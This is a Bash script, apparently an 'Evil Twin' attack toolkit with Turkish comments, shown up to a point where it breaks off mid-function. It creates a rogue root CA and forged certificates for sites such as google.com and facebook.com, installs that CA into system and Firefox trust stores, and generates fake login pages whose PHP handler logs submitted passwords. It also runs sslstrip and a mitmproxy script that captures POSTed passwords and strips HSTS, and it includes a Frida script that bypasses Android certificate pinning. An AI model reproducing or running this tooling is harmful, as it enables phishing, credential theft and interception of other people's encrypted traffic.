#!/bin/bash

# Evil Twin Attack - SSL Certificate Manager
# Bu script SSL sertifika yönetimi ve HTTPS trafiği manipülasyonu yapar
# Kullanım: ./ssl_manager.sh [options]

# Renkli çıktı için ANSI kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${PURPLE}"
echo "═══════════════════════════════════════════════════════════════"
echo "                    EVIL TWIN ATTACK TOOLKIT                  "
echo "                    SSL Certificate Manager                   "
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

# Root kontrolü
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Bu script root yetkileri ile çalıştırılmalıdır!${NC}"
   echo -e "${YELLOW}[*] Kullanım: sudo $0 [options]${NC}"
   exit 1
fi

# Etik uyarı
echo -e "${RED}"
echo "⚠️  ETİK UYARI ⚠️"
echo "Bu araç yalnızca eğitim amaçlı ve kendi ağlarınızda test için kullanılmalıdır."
echo "SSL sertifika manipülasyonu ve HTTPS trafiği ele geçirme yasadışıdır."
echo "Bu aracı kullanarak tüm sorumluluğu kabul etmiş olursunuz."
echo -e "${NC}"

# Parametreler
DOMAIN="example.com"
CERT_DIR="/tmp/evil_twin_certs"
CA_DIR="$CERT_DIR/ca"
SERVER_DIR="$CERT_DIR/server"
CLIENT_DIR="$CERT_DIR/client"
WILDCARD_CERT=false
CREATE_CA=false
CREATE_SERVER_CERT=false
CREATE_CLIENT_CERT=false
INSTALL_CA=false
START_HTTPS_SERVER=false
START_SSLSTRIP=false
START_MITM_PROXY=false
HTTPS_PORT="443"
SSLSTRIP_PORT="8080"
MITM_PORT="8443"
COUNTRY="TR"
STATE="Istanbul"
CITY="Istanbul"
ORGANIZATION="Evil Twin Test"
ORGANIZATIONAL_UNIT="Security Testing"
EMAIL="admin@eviltwin.local"
KEY_SIZE="2048"
VALID_DAYS="365"
OUTPUT_DIR="/tmp/evil_twin_ssl"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_FILE="$OUTPUT_DIR/ssl_manager_$TIMESTAMP.log"
SSLSTRIP_LOG="$OUTPUT_DIR/sslstrip_$TIMESTAMP.log"
MITM_LOG="$OUTPUT_DIR/mitm_proxy_$TIMESTAMP.log"
HTTPS_LOG="$OUTPUT_DIR/https_server_$TIMESTAMP.log"
VERBOSE=false
AUTO_INSTALL=false
BACKUP_EXISTING=true
GENERATE_WILDCARD=false
USE_EXISTING_CA=false
EXISTING_CA_PATH=""
CUSTOM_DOMAINS=()
SAN_DOMAINS=()
SSLSTRIP_PID=""
MITM_PID=""
HTTPS_PID=""
APACHE_PID=""
NGINX_PID=""
CREATE_FAKE_SITES=false
FAKE_SITES_DIR="$OUTPUT_DIR/fake_sites"
SSL_KILL_SWITCH=false
CERT_TRANSPARENCY=false
HSTS_BYPASS=false
CERT_PINNING_BYPASS=false

# Global değişkenler
declare -A CERT_INFO
declare -A SSL_CONFIGS
declare -A FAKE_SITES
CERTS_CREATED=0
SSL_CONNECTIONS=0
BYPASSED_SITES=0
CAPTURED_CREDENTIALS=0

# Fonksiyonlar
print_status() {
    echo -e "${BLUE}[*] $1${NC}"
    [ "$VERBOSE" = true ] && echo "$(date): [INFO] $1" >> "$LOG_FILE"
}

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
    [ "$VERBOSE" = true ] && echo "$(date): [SUCCESS] $1" >> "$LOG_FILE"
}

print_error() {
    echo -e "${RED}[!] $1${NC}"
    [ "$VERBOSE" = true ] && echo "$(date): [ERROR] $1" >> "$LOG_FILE"
}

print_warning() {
    echo -e "${YELLOW}[⚠] $1${NC}"
    [ "$VERBOSE" = true ] && echo "$(date): [WARNING] $1" >> "$LOG_FILE"
}

print_cert() {
    echo -e "${CYAN}[🔒] $1${NC}"
    [ "$VERBOSE" = true ] && echo "$(date): [CERT] $1" >> "$LOG_FILE"
}

# Kullanım bilgisi
show_usage() {
    echo -e "${YELLOW}Kullanım:${NC}"
    echo -e "  ${CYAN}$0 [options]${NC}"
    echo
    echo -e "${YELLOW}Seçenekler:${NC}"
    echo -e "  ${CYAN}-d, --domain <domain>${NC}      Hedef domain (varsayılan: example.com)"
    echo -e "  ${CYAN}-o, --output <dir>${NC}         Çıktı dizini"
    echo -e "  ${CYAN}--cert-dir <dir>${NC}           Sertifika dizini"
    echo -e "  ${CYAN}--create-ca${NC}                CA sertifikası oluştur"
    echo -e "  ${CYAN}--create-server${NC}            Sunucu sertifikası oluştur"
    echo -e "  ${CYAN}--create-client${NC}            İstemci sertifikası oluştur"
    echo -e "  ${CYAN}--wildcard${NC}                 Wildcard sertifika oluştur"
    echo -e "  ${CYAN}--install-ca${NC}               CA'yı sisteme yükle"
    echo -e "  ${CYAN}--https-server${NC}             HTTPS sunucusu başlat"
    echo -e "  ${CYAN}--sslstrip${NC}                 SSLstrip başlat"
    echo -e "  ${CYAN}--mitm-proxy${NC}               MITM proxy başlat"
    echo -e "  ${CYAN}--fake-sites${NC}               Sahte siteler oluştur"
    echo -e "  ${CYAN}--ssl-kill${NC}                 SSL kill switch"
    echo -e "  ${CYAN}--hsts-bypass${NC}              HSTS bypass"
    echo -e "  ${CYAN}--cert-pinning-bypass${NC}      Certificate pinning bypass"
    echo -e "  ${CYAN}--https-port <port>${NC}        HTTPS port (varsayılan: 443)"
    echo -e "  ${CYAN}--sslstrip-port <port>${NC}     SSLstrip port (varsayılan: 8080)"
    echo -e "  ${CYAN}--mitm-port <port>${NC}         MITM port (varsayılan: 8443)"
    echo -e "  ${CYAN}--country <code>${NC}           Ülke kodu (varsayılan: TR)"
    echo -e "  ${CYAN}--state <state>${NC}            Eyalet (varsayılan: Istanbul)"
    echo -e "  ${CYAN}--city <city>${NC}              Şehir (varsayılan: Istanbul)"
    echo -e "  ${CYAN}--org <organization>${NC}       Organizasyon"
    echo -e "  ${CYAN}--email <email>${NC}            E-posta adresi"
    echo -e "  ${CYAN}--key-size <size>${NC}          Anahtar boyutu (varsayılan: 2048)"
    echo -e "  ${CYAN}--valid-days <days>${NC}        Geçerlilik süresi (varsayılan: 365)"
    echo -e "  ${CYAN}--san-domains <domains>${NC}    SAN domainleri (virgülle ayrılmış)"
    echo -e "  ${CYAN}--use-existing-ca <path>${NC}   Mevcut CA kullan"
    echo -e "  ${CYAN}--auto-install${NC}             Otomatik yükleme"
    echo -e "  ${CYAN}--no-backup${NC}                Yedekleme yapma"
    echo -e "  ${CYAN}-v, --verbose${NC}              Detaylı çıktı"
    echo -e "  ${CYAN}-h, --help${NC}                 Bu yardım mesajı"
    echo
    echo -e "${YELLOW}Örnekler:${NC}"
    echo -e "  ${CYAN}sudo $0 --create-ca --create-server -d google.com${NC}"
    echo -e "  ${CYAN}sudo $0 --wildcard -d *.facebook.com --install-ca${NC}"
    echo -e "  ${CYAN}sudo $0 --sslstrip --mitm-proxy --fake-sites${NC}"
    echo -e "  ${CYAN}sudo $0 --ssl-kill --hsts-bypass${NC}"
    echo
}

# Komut satırı argümanlarını işle
parse_arguments() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -d|--domain)
                DOMAIN="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            --cert-dir)
                CERT_DIR="$2"
                shift 2
                ;;
            --create-ca)
                CREATE_CA=true
                shift
                ;;
            --create-server)
                CREATE_SERVER_CERT=true
                shift
                ;;
            --create-client)
                CREATE_CLIENT_CERT=true
                shift
                ;;
            --wildcard)
                WILDCARD_CERT=true
                GENERATE_WILDCARD=true
                shift
                ;;
            --install-ca)
                INSTALL_CA=true
                shift
                ;;
            --https-server)
                START_HTTPS_SERVER=true
                shift
                ;;
            --sslstrip)
                START_SSLSTRIP=true
                shift
                ;;
            --mitm-proxy)
                START_MITM_PROXY=true
                shift
                ;;
            --fake-sites)
                CREATE_FAKE_SITES=true
                shift
                ;;
            --ssl-kill)
                SSL_KILL_SWITCH=true
                shift
                ;;
            --hsts-bypass)
                HSTS_BYPASS=true
                shift
                ;;
            --cert-pinning-bypass)
                CERT_PINNING_BYPASS=true
                shift
                ;;
            --https-port)
                HTTPS_PORT="$2"
                shift 2
                ;;
            --sslstrip-port)
                SSLSTRIP_PORT="$2"
                shift 2
                ;;
            --mitm-port)
                MITM_PORT="$2"
                shift 2
                ;;
            --country)
                COUNTRY="$2"
                shift 2
                ;;
            --state)
                STATE="$2"
                shift 2
                ;;
            --city)
                CITY="$2"
                shift 2
                ;;
            --org)
                ORGANIZATION="$2"
                shift 2
                ;;
            --email)
                EMAIL="$2"
                shift 2
                ;;
            --key-size)
                KEY_SIZE="$2"
                shift 2
                ;;
            --valid-days)
                VALID_DAYS="$2"
                shift 2
                ;;
            --san-domains)
                IFS=',' read -ra SAN_DOMAINS <<< "$2"
                shift 2
                ;;
            --use-existing-ca)
                USE_EXISTING_CA=true
                EXISTING_CA_PATH="$2"
                shift 2
                ;;
            --auto-install)
                AUTO_INSTALL=true
                shift
                ;;
            --no-backup)
                BACKUP_EXISTING=false
                shift
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            -*)
                print_error "Bilinmeyen seçenek: $1"
                show_usage
                exit 1
                ;;
            *)
                print_error "Fazla parametre: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

# Gerekli araçları kontrol et
check_dependencies() {
    print_status "Gerekli araçlar kontrol ediliyor..."
    
    local missing_tools=()
    
    # Temel araçlar
    local required_tools=("openssl")
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    # Opsiyonel araçlar
    if [ "$START_SSLSTRIP" = true ]; then
        if ! command -v "sslstrip" &> /dev/null && ! command -v "python" &> /dev/null; then
            missing_tools+=("sslstrip veya python")
        fi
    fi
    
    if [ "$START_MITM_PROXY" = true ]; then
        if ! command -v "mitmproxy" &> /dev/null; then
            missing_tools+=("mitmproxy")
        fi
    fi
    
    if [ "$START_HTTPS_SERVER" = true ]; then
        if ! command -v "apache2" &> /dev/null && ! command -v "nginx" &> /dev/null; then
            missing_tools+=("apache2 veya nginx")
        fi
    fi
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        print_error "Eksik araçlar: ${missing_tools[*]}"
        print_status "Kurulum için: apt-get install openssl sslstrip mitmproxy apache2 nginx"
        exit 1
    fi
    
    print_success "Tüm gerekli araçlar mevcut"
}

# Dizinleri hazırla
setup_directories() {
    print_status "Dizinler hazırlanıyor..."
    
    # Ana dizinler
    for dir in "$OUTPUT_DIR" "$CERT_DIR" "$CA_DIR" "$SERVER_DIR" "$CLIENT_DIR" "$FAKE_SITES_DIR"; do
        if [ ! -d "$dir" ]; then
            mkdir -p "$dir"
            print_status "Dizin oluşturuldu: $dir"
        fi
    done
    
    # Dosya yollarını güncelle
    LOG_FILE="$OUTPUT_DIR/ssl_manager_$TIMESTAMP.log"
    SSLSTRIP_LOG="$OUTPUT_DIR/sslstrip_$TIMESTAMP.log"
    MITM_LOG="$OUTPUT_DIR/mitm_proxy_$TIMESTAMP.log"
    HTTPS_LOG="$OUTPUT_DIR/https_server_$TIMESTAMP.log"
    
    print_success "Dizinler hazırlandı"
}

# CA sertifikası oluştur
create_ca_certificate() {
    if [ "$CREATE_CA" = true ]; then
        print_status "CA sertifikası oluşturuluyor..."
        
        local ca_key="$CA_DIR/ca.key"
        local ca_cert="$CA_DIR/ca.crt"
        local ca_config="$CA_DIR/ca.conf"
        
        # Mevcut CA'yı yedekle
        if [ "$BACKUP_EXISTING" = true ] && [ -f "$ca_cert" ]; then
            cp "$ca_cert" "$ca_cert.backup_$TIMESTAMP"
            print_status "Mevcut CA yedeklendi"
        fi
        
        # CA yapılandırma dosyası
        cat > "$ca_config" << EOF
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_ca
prompt = no

[req_distinguished_name]
C = $COUNTRY
ST = $STATE
L = $CITY
O = $ORGANIZATION CA
OU = $ORGANIZATIONAL_UNIT
CN = Evil Twin Root CA
emailAddress = $EMAIL

[v3_ca]
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid:always,issuer
basicConstraints = critical,CA:true
keyUsage = critical, digitalSignature, cRLSign, keyCertSign
EOF
        
        # CA private key oluştur
        openssl genrsa -out "$ca_key" "$KEY_SIZE" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            print_success "CA private key oluşturuldu"
        else
            print_error "CA private key oluşturulamadı"
            return 1
        fi
        
        # CA sertifikası oluştur
        openssl req -new -x509 -days "$VALID_DAYS" -key "$ca_key" -out "$ca_cert" -config "$ca_config" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            print_success "CA sertifikası oluşturuldu: $ca_cert"
            CERT_INFO["CA"]="$ca_cert"
            ((CERTS_CREATED++))
        else
            print_error "CA sertifikası oluşturulamadı"
            return 1
        fi
        
        # CA bilgilerini göster
        if [ "$VERBOSE" = true ]; then
            print_cert "CA Sertifika Bilgileri:"
            openssl x509 -in "$ca_cert" -text -noout | grep -E "Subject:|Issuer:|Not Before:|Not After:"
        fi
    fi
}

# Sunucu sertifikası oluştur
create_server_certificate() {
    if [ "$CREATE_SERVER_CERT" = true ]; then
        print_status "Sunucu sertifikası oluşturuluyor..."
        
        local server_key="$SERVER_DIR/${DOMAIN}.key"
        local server_csr="$SERVER_DIR/${DOMAIN}.csr"
        local server_cert="$SERVER_DIR/${DOMAIN}.crt"
        local server_config="$SERVER_DIR/${DOMAIN}.conf"
        local ca_key="$CA_DIR/ca.key"
        local ca_cert="$CA_DIR/ca.crt"
        
        # CA kontrolü
        if [ ! -f "$ca_cert" ] || [ ! -f "$ca_key" ]; then
            if [ "$USE_EXISTING_CA" = true ] && [ -n "$EXISTING_CA_PATH" ]; then
                ca_cert="$EXISTING_CA_PATH/ca.crt"
                ca_key="$EXISTING_CA_PATH/ca.key"
            else
                print_error "CA sertifikası bulunamadı. Önce --create-ca kullanın."
                return 1
            fi
        fi
        
        # Sunucu yapılandırma dosyası
        cat > "$server_config" << EOF
[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[req_distinguished_name]
C = $COUNTRY
ST = $STATE
L = $CITY
O = $ORGANIZATION
OU = $ORGANIZATIONAL_UNIT
CN = $DOMAIN
emailAddress = $EMAIL

[v3_req]
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
subjectAltName = @alt_names

[alt_names]
DNS.1 = $DOMAIN
EOF
        
        # Wildcard sertifika için
        if [ "$WILDCARD_CERT" = true ]; then
            echo "DNS.2 = *.$DOMAIN" >> "$server_config"
        fi
        
        # SAN domainleri ekle
        local san_count=2
        if [ "$WILDCARD_CERT" = true ]; then
            san_count=3
        fi
        
        for san_domain in "${SAN_DOMAINS[@]}"; do
            echo "DNS.$san_count = $san_domain" >> "$server_config"
            ((san_count++))
        done
        
        # Sunucu private key oluştur
        openssl genrsa -out "$server_key" "$KEY_SIZE" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            print_success "Sunucu private key oluşturuldu"
        else
            print_error "Sunucu private key oluşturulamadı"
            return 1
        fi
        
        # CSR oluştur
        openssl req -new -key "$server_key" -out "$server_csr" -config "$server_config" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            print_success "CSR oluşturuldu"
        else
            print_error "CSR oluşturulamadı"
            return 1
        fi
        
        # Sunucu sertifikası oluştur
        openssl x509 -req -in "$server_csr" -CA "$ca_cert" -CAkey "$ca_key" -CAcreateserial -out "$server_cert" -days "$VALID_DAYS" -extensions v3_req -extfile "$server_config" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            print_success "Sunucu sertifikası oluşturuldu: $server_cert"
            CERT_INFO["SERVER"]="$server_cert"
            ((CERTS_CREATED++))
        else
            print_error "Sunucu sertifikası oluşturulamadı"
            return 1
        fi
        
        # PEM formatında birleştir
        cat "$server_cert" "$ca_cert" > "$SERVER_DIR/${DOMAIN}_fullchain.pem"
        cp "$server_key" "$SERVER_DIR/${DOMAIN}_private.pem"
        
        print_success "PEM dosyaları oluşturuldu"
        
        # Sertifika bilgilerini göster
        if [ "$VERBOSE" = true ]; then
            print_cert "Sunucu Sertifika Bilgileri:"
            openssl x509 -in "$server_cert" -text -noout | grep -E "Subject:|Issuer:|Not Before:|Not After:|DNS:"
        fi
    fi
}

# İstemci sertifikası oluştur
create_client_certificate() {
    if [ "$CREATE_CLIENT_CERT" = true ]; then
        print_status "İstemci sertifikası oluşturuluyor..."
        
        local client_key="$CLIENT_DIR/client.key"
        local client_csr="$CLIENT_DIR/client.csr"
        local client_cert="$CLIENT_DIR/client.crt"
        local client_config="$CLIENT_DIR/client.conf"
        local ca_key="$CA_DIR/ca.key"
        local ca_cert="$CA_DIR/ca.crt"
        
        # CA kontrolü
        if [ ! -f "$ca_cert" ] || [ ! -f "$ca_key" ]; then
            print_error "CA sertifikası bulunamadı. Önce --create-ca kullanın."
            return 1
        fi
        
        # İstemci yapılandırma dosyası
        cat > "$client_config" << EOF
[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[req_distinguished_name]
C = $COUNTRY
ST = $STATE
L = $CITY
O = $ORGANIZATION
OU = $ORGANIZATIONAL_UNIT
CN = Evil Twin Client
emailAddress = $EMAIL

[v3_req]
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
extendedKeyUsage = clientAuth
EOF
        
        # İstemci private key oluştur
        openssl genrsa -out "$client_key" "$KEY_SIZE" 2>/dev/null
        
        # CSR oluştur
        openssl req -new -key "$client_key" -out "$client_csr" -config "$client_config" 2>/dev/null
        
        # İstemci sertifikası oluştur
        openssl x509 -req -in "$client_csr" -CA "$ca_cert" -CAkey "$ca_key" -CAcreateserial -out "$client_cert" -days "$VALID_DAYS" -extensions v3_req -extfile "$client_config" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            print_success "İstemci sertifikası oluşturuldu: $client_cert"
            CERT_INFO["CLIENT"]="$client_cert"
            ((CERTS_CREATED++))
        else
            print_error "İstemci sertifikası oluşturulamadı"
            return 1
        fi
        
        # PKCS#12 formatında dışa aktar
        openssl pkcs12 -export -out "$CLIENT_DIR/client.p12" -inkey "$client_key" -in "$client_cert" -certfile "$ca_cert" -password pass:eviltwin 2>/dev/null
        
        print_success "PKCS#12 dosyası oluşturuldu (şifre: eviltwin)"
    fi
}

# CA'yı sisteme yükle
install_ca_certificate() {
    if [ "$INSTALL_CA" = true ]; then
        print_status "CA sertifikası sisteme yükleniyor..."
        
        local ca_cert="$CA_DIR/ca.crt"
        
        if [ ! -f "$ca_cert" ]; then
            print_error "CA sertifikası bulunamadı"
            return 1
        fi
        
        # Ubuntu/Debian için
        if command -v "update-ca-certificates" &> /dev/null; then
            cp "$ca_cert" "/usr/local/share/ca-certificates/evil-twin-ca.crt"
            update-ca-certificates
            print_success "CA sertifikası sisteme yüklendi (Ubuntu/Debian)"
        # CentOS/RHEL için
        elif command -v "update-ca-trust" &> /dev/null; then
            cp "$ca_cert" "/etc/pki/ca-trust/source/anchors/evil-twin-ca.crt"
            update-ca-trust
            print_success "CA sertifikası sisteme yüklendi (CentOS/RHEL)"
        else
            print_warning "CA sertifikası otomatik yüklenemedi. Manuel yükleme gerekli."
        fi
        
        # Firefox için
        local firefox_profiles=$(find ~/.mozilla/firefox -name "*.default*" -type d 2>/dev/null)
        for profile in $firefox_profiles; do
            if [ -d "$profile" ]; then
                certutil -A -n "Evil Twin CA" -t "TCu,Cu,Tu" -i "$ca_cert" -d "$profile" 2>/dev/null
                print_success "CA Firefox profiline yüklendi: $profile"
            fi
        done
    fi
}

# Sahte siteler oluştur
create_fake_sites() {
    if [ "$CREATE_FAKE_SITES" = true ]; then
        print_status "Sahte siteler oluşturuluyor..."
        
        # Popüler sitelerin sahte versiyonları
        local sites=("google.com" "facebook.com" "twitter.com" "instagram.com" "linkedin.com" "github.com")
        
        for site in "${sites[@]}"; do
            local site_dir="$FAKE_SITES_DIR/$site"
            mkdir -p "$site_dir"
            
            # Basit giriş sayfası
            cat > "$site_dir/index.html" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>$site - Giriş</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 50px; }
        .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
        input { width: 100%; padding: 10px; margin: 10px 0; }
        button { width: 100%; padding: 10px; background: #4267B2; color: white; border: none; }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>$site Giriş</h2>
        <form action="capture.php" method="post">
            <input type="hidden" name="site" value="$site">
            <input type="email" name="email" placeholder="E-posta" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
EOF
            
            # Veri yakalama scripti
            cat > "$site_dir/capture.php" << 'EOF'
<?php
$site = $_POST['site'] ?? 'unknown';
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$timestamp = date('Y-m-d H:i:s');

$log_entry = "[$timestamp] Site: $site, IP: $ip, Email: $email, Password: $password, User-Agent: $user_agent\n";
file_put_contents('/tmp/evil_twin_ssl/captured_credentials.log', $log_entry, FILE_APPEND | LOCK_EX);

// Gerçek siteye yönlendir
header("Location: https://$site");
exit();
?>
EOF
            
            FAKE_SITES["$site"]="$site_dir"
            print_success "Sahte site oluşturuldu: $site"
        done
    fi
}

# HTTPS sunucusu başlat
start_https_server() {
    if [ "$START_HTTPS_SERVER" = true ]; then
        print_status "HTTPS sunucusu başlatılıyor..."
        
        local server_cert="$SERVER_DIR/${DOMAIN}_fullchain.pem"
        local server_key="$SERVER_DIR/${DOMAIN}_private.pem"
        
        if [ ! -f "$server_cert" ] || [ ! -f "$server_key" ]; then
            print_error "Sunucu sertifikaları bulunamadı"
            return 1
        fi
        
        # Apache yapılandırması
        if command -v "apache2" &> /dev/null; then
            local apache_config="$OUTPUT_DIR/apache_ssl.conf"
            
            cat > "$apache_config" << EOF
<VirtualHost *:$HTTPS_PORT>
    ServerName $DOMAIN
    DocumentRoot $FAKE_SITES_DIR
    
    SSLEngine on
    SSLCertificateFile $server_cert
    SSLCertificateKeyFile $server_key
    
    # SSL güvenlik ayarları
    SSLProtocol all -SSLv2 -SSLv3
    SSLCipherSuite ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
    SSLHonorCipherOrder on
    
    # Log dosyaları
    ErrorLog $OUTPUT_DIR/apache_error.log
    CustomLog $OUTPUT_DIR/apache_access.log combined
    
    # PHP desteği
    <FilesMatch \.php$>
        SetHandler application/x-httpd-php
    </FilesMatch>
</VirtualHost>
EOF
            
            # Apache başlat
            apache2 -f "$apache_config" -D FOREGROUND > "$HTTPS_LOG" 2>&1 &
            APACHE_PID=$!
            
            sleep 2
            
            if kill -0 "$APACHE_PID" 2>/dev/null; then
                print_success "Apache HTTPS sunucusu başlatıldı (PID: $APACHE_PID, Port: $HTTPS_PORT)"
                echo "$APACHE_PID" > "$OUTPUT_DIR/apache.pid"
            else
                print_warning "Apache başlatılamadı"
            fi
        
        # Nginx alternatifi
        elif command -v "nginx" &> /dev/null; then
            local nginx_config="$OUTPUT_DIR/nginx_ssl.conf"
            
            cat > "$nginx_config" << EOF
server {
    listen $HTTPS_PORT ssl;
    server_name $DOMAIN;
    root $FAKE_SITES_DIR;
    index index.html index.php;
    
    ssl_certificate $server_cert;
    ssl_certificate_key $server_key;
    
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
    
    access_log $OUTPUT_DIR/nginx_access.log;
    error_log $OUTPUT_DIR/nginx_error.log;
    
    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME \$document_root\$fastcgi_script_name;
    }
}
EOF
            
            nginx -c "$nginx_config" > "$HTTPS_LOG" 2>&1 &
            NGINX_PID=$!
            
            sleep 2
            
            if kill -0 "$NGINX_PID" 2>/dev/null; then
                print_success "Nginx HTTPS sunucusu başlatıldı (PID: $NGINX_PID, Port: $HTTPS_PORT)"
                echo "$NGINX_PID" > "$OUTPUT_DIR/nginx.pid"
            else
                print_warning "Nginx başlatılamadı"
            fi
        else
            print_warning "Web sunucusu bulunamadı"
        fi
    fi
}

# SSLstrip başlat
start_sslstrip() {
    if [ "$START_SSLSTRIP" = true ]; then
        print_status "SSLstrip başlatılıyor..."
        
        # SSLstrip komutu
        if command -v "sslstrip" &> /dev/null; then
            nohup sslstrip -l "$SSLSTRIP_PORT" -w "$SSLSTRIP_LOG" > "$OUTPUT_DIR/sslstrip_output_$TIMESTAMP.txt" 2>&1 &
            SSLSTRIP_PID=$!
        elif command -v "python" &> /dev/null; then
            # Python sslstrip
            nohup python -m sslstrip.sslstrip -l "$SSLSTRIP_PORT" -w "$SSLSTRIP_LOG" > "$OUTPUT_DIR/sslstrip_output_$TIMESTAMP.txt" 2>&1 &
            SSLSTRIP_PID=$!
        else
            print_error "SSLstrip bulunamadı"
            return 1
        fi
        
        sleep 2
        
        if kill -0 "$SSLSTRIP_PID" 2>/dev/null; then
            print_success "SSLstrip başlatıldı (PID: $SSLSTRIP_PID, Port: $SSLSTRIP_PORT)"
            echo "$SSLSTRIP_PID" > "$OUTPUT_DIR/sslstrip.pid"
        else
            print_warning "SSLstrip başlatılamadı"
        fi
    fi
}

# MITM proxy başlat
start_mitm_proxy() {
    if [ "$START_MITM_PROXY" = true ]; then
        print_status "MITM proxy başlatılıyor..."
        
        if command -v "mitmproxy" &> /dev/null; then
            # MITM proxy scripti
            cat > "$OUTPUT_DIR/mitm_script.py" << 'EOF'
from mitmproxy import http
import logging

def request(flow: http.HTTPFlow) -> None:
    # İstekleri logla
    logging.info(f"Request: {flow.request.method} {flow.request.pretty_url}")
    
    # Hassas verileri yakala
    if flow.request.method == "POST":
        if "password" in flow.request.text.lower() or "login" in flow.request.text.lower():
            with open("/tmp/evil_twin_ssl/mitm_captured.log", "a") as f:
                f.write(f"Captured POST data: {flow.request.text}\n")

def response(flow: http.HTTPFlow) -> None:
    # Yanıtları modifiye et
    if "text/html" in flow.response.headers.get("content-type", ""):
        # HSTS başlıklarını kaldır
        flow.response.headers.pop("strict-transport-security", None)
        
        # Certificate pinning bypass
        if "certificate" in flow.response.text.lower():
            flow.response.text = flow.response.text.replace(
                "certificate-pinning", "certificate-disabled"
            )
EOF
            
            nohup mitmproxy -s "$OUTPUT_DIR/mitm_script.py" -p "$MITM_PORT" --set confdir="$OUTPUT_DIR" > "$MITM_LOG" 2>&1 &
            MITM_PID=$!
            
            sleep 3
            
            if kill -0 "$MITM_PID" 2>/dev/null; then
                print_success "MITM proxy başlatıldı (PID: $MITM_PID, Port: $MITM_PORT)"
                echo "$MITM_PID" > "$OUTPUT_DIR/mitm.pid"
            else
                print_warning "MITM proxy başlatılamadı"
            fi
        else
            print_error "mitmproxy bulunamadı"
        fi
    fi
}

# SSL kill switch
setup_ssl_kill_switch() {
    if [ "$SSL_KILL_SWITCH" = true ]; then
        print_status "SSL kill switch ayarlanıyor..."
        
        # HTTPS portlarını engelle
        iptables -A OUTPUT -p tcp --dport 443 -j DROP
        iptables -A FORWARD -p tcp --dport 443 -j DROP
        
        # Diğer SSL portları
        for port in 993 995 465 587 636 989 990; do
            iptables -A OUTPUT -p tcp --dport $port -j DROP
            iptables -A FORWARD -p tcp --dport $port -j DROP
        done
        
        print_success "SSL kill switch etkinleştirildi"
    fi
}

# HSTS bypass
setup_hsts_bypass() {
    if [ "$HSTS_BYPASS" = true ]; then
        print_status "HSTS bypass ayarlanıyor..."
        
        # HSTS preload listesini temizle
        local hsts_script="$OUTPUT_DIR/hsts_bypass.py"
        
        cat > "$hsts_script" << 'EOF'
#!/usr/bin/env python3
import re
import sys

def remove_hsts_headers(data):
    # HSTS başlıklarını kaldır
    data = re.sub(r'Strict-Transport-Security:.*\r\n', '', data, flags=re.IGNORECASE)
    data = re.sub(r'Public-Key-Pins:.*\r\n', '', data, flags=re.IGNORECASE)
    return data

if __name__ == "__main__":
    for line in sys.stdin:
        print(remove_hsts_headers(line), end='')
EOF
        
        chmod +x "$hsts_script"
        print_success "HSTS bypass scripti oluşturuldu"
    fi
}

# Certificate pinning bypass
setup_cert_pinning_bypass() {
    if [ "$CERT_PINNING_BYPASS" = true ]; then
        print_status "Certificate pinning bypass ayarlanıyor..."
        
        # Frida scripti (Android için)
        cat > "$OUTPUT_DIR/cert_pinning_bypass.js" << 'EOF'
Java.perform(function() {
    // OkHttp Certificate Pinning Bypass
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
        console.log("[+] Certificate pinning bypassed for: " + hostname);
        return;
    };
    
    // TrustManager Bypass
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    var TrustManager = Java.registerClass({
        name: 'com.eviltwin.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() {
                return [];
            }
        }
    });
    
    console.log("[+] Certificate pinning bypass loaded");
});
EOF
        
        print_success "Certificate pinning bypass scripti oluşturuldu"
    fi
}

# Durum kontrolü
check_status() {
    echo
